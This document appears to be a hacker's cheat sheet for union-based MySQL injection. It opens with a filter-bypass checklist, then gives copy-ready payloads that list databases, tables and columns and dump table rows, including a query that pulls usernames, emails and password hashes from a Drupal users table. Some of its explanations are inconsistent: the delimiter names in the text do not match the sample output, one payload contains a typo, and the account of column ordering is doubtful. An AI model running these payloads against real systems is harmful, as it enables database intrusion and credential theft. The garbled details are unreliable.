---------------------------------------------------INTRODUCTION---------------------------------------------------------------------------
FORMAT OF OUTPUT DATA
------------------------------
qqxbqinformation_schemaqqxxq
------------------------------

we just have to grep the output for text between QQXBQ and QQXXQ.

To extract text, just pipe it to:

sed -e 's/qqxbq\(.*\)qqxxq/\1/'

---------------------------------------------------END OF INTODUCTION---------------------------------------------------------------------------


--------------------------------------------------CHECKLIST--------------------------------------------------------------------------

1. Try ' OR 1=1#
2. Look at the error,if any. Some args like ' ,--,OR etccan be blacklisted. 
If the provided characters are missing, then they are blacklisted.
If blacklisted, they can be replaced for alternate symbols.

Comments can be replaced by:

 	#comment
-- comment [Note the space after the double dash]
/*comment*/

OR can be replaced by ||

eg: 

' OR 1=1#

is the same as

' || 1=1# 

---------------------------------------------------END OF CHECKLIST---------------------------------------------------------------------------

---------------------------------------------------MYSQL INJECTION LIST---------------------------------------------------------------------------

1. To ListDataBases
---------------------

  UNION UNION ALL SELECT CONCAT(0x7171786271,IFNULL(CAST(schema_name AS CHAR),0x20),0x7171787871),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM INFORMATION_SCHEMA.SCHEMATA-- oDDv

the output data will be like this.

2. Enumerate Tables of a given database
------------------------------------------

 UNION ALL SELECT NULL,CONCAT(0x7171786271,IFNULL(CAST(table_name AS CHAR),0x20),0x7171787871),NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM INFORMATION_SCHEMA.TABLES WHERE table_schema IN (0x6a61626364306373)-- hHOw

 We just have to convert the database name to hex.
 the first ascii is QQXBQ and second one is QQXXQ.The last ascii is the database name.

 ascii to hex(DONOT USE ECHO SINCE ECHO AUTOMATICALLY ADDS 0a:\n NEW LINE CHARACTER. EITHER USE PRINTF OR REMOVE LAST 0a MANUALLY)
 -------------
 printf database|xxd -p

 hex to ascii
 -------------
 echo 0x00000 |xxd -r
 
 3. Enumerate Column names of Table
------------------------------------

UNION ALL SELECT NULL,CONCAT(0x7171786271,IFNULL(CAST(column_name AS CHAR),0x20),0x686c746d6565,IFNULL(CAST(column_type AS CHAR),0x20),0x7171787871),NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x6f646d5f61646d696e AND table_schema=0x6a61626364306373-- SWyg


we have 3 flag strings here.
1st string: start of column_name :Flagged as QQXBQ
2nd string: end of column_name and start of data_type :Flagged as HLTMEE
3rd string: end of data_type :Flagged as QQXXQ

example:

Data in database:
-------------

+--------+------------------+
| Column | Type             |
+--------+------------------+
| admin  | tinyint(4)       |
| id     | int(11) unsigned |
+--------+------------------+

Data returned:
-------------

qqxbqidFINint(11) unsignedqqxxq 
qqxbqadminFINtinyint(4)qqxxq

Easily SED'able! ;)

4. Dump Table Data
--------------------


Structure of injection command
---------------------------------

UNION ALL SELECT NULL,CONCAT(0x7171786271,IFNULL(CAST(!!COLUMN_1!! AS CHAR),0x20),0x686c746d6565,IFNULL(CAST(!!COLUMN_2!! AS CHAR),0x20),0x7171787871),NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM !!db-name!!.!!table-name!!-- qvOY

Placeholders Explained
-------------------------

we have 3 flag strings here.
1st string: start of column_name :Flagged as QQXBQ
2nd string: end of column_name and start of data_type :Flagged as HLTMEE
3rd string: end of data_type :Flagged as QQXXQ

and :

!!COLUMN_1!! - column name from which data to retrieve
!!COLUMN_2!! - column name from which data to retrieve
!!db-name!!-   name of database
!!table-name!!- name of table

NB: I created the !!NAME!! pattern to distinguish between SQL commands. When replacing replace the whole words incluidng the two !! a the begining and end. I could've used {} ,but then it'd be too confusing.

An actual example query is given below.


Example:

Query
------


UNION ALL SELECT NULL,CONCAT(0x7171786271,IFNULL(CAST(admin AS CHAR),0x20),0x686c746d6565,IFNULL(CAST(id AS CHAR),0x20),0x7171787871),NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM jabcd0cs.odm_admin-- qvOY


Data in database:
-------------
+----+-------+
| id | admin |
+----+-------+
| 1  | 1     |
| 2  | 0     |
+----+-------+

Data returned:
-------------
qvvxq1hltmee1qpvzq :ordered as id,admin : LIFO type;Row wise

qvvxq0hltmee2qpvzq :ordered as id,admin : LIFO type;Row wise

Remember, the data is retrieved row per row. So, eventhough we specified column admin first, we will recieve data of id first.
ie, LIFO type.

THE ORDER IN COMMAND:
----------------------

admin,id

THE ORDER IN OUTPUT:
----------------------

id,admin

Long Example :
----------------
UNION ALL SELECT NULL,CONCAT(0x7176767871,IFNULL(CAST(`language` AS CHAR),0x20),0x686c746d6565,IFNULL(CAST(access AS CHAR),0x20),0x686c746d6565,IFNULL(CAST(created AS CHAR),0x20),0x686c746d6565,IFNULL(CAST(data AS CHAR),0x20),0x686c746d6565,IFNULL(CAST(init AS CHAR),0x20),0x686c746d6565,IFNULL(CAST(login AS CHAR),0x20),0x686c746d6565,IFNULL(CAST(mail AS CHAR),0x20),0x686c746d6565,IFNULL(CAST(name AS CHAR),0x20),0x686c746d6565,IFNULL(CAST(pass AS CHAR),0x20),0x686c746d6565,IFNULL(CAST(picture AS CHAR),0x20),0x686c746d6565,IFNULL(CAST(signature AS CHAR),0x20),0x686c746d6565,IFNULL(CAST(signature_format AS CHAR),0x20),0x686c746d6565,IFNULL(CAST(status AS CHAR),0x20),0x686c746d6565,IFNULL(CAST(theme AS CHAR),0x20),0x686c746d6565,IFNULL(CAST(timezone AS CHAR),0x20),0x686c746d6565,IFNULL(CAST(uid AS CHAR),0x20),0x7170767a71),NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM drupal7.users-- qUmS


For,those who still don't understand, here's a long query example.
We have 16 columns namely:

uid
name
init 
theme 
login 
pass 
acces 
status 
picture 
created 
timezone 
mail 
signature 
language
data
signature_format

and database named :
drupal7

and table named: 
users

TODO-HOW_TO_ENUM_WHICH_DATABASE_IS_RUNNING??





 
 
 
 
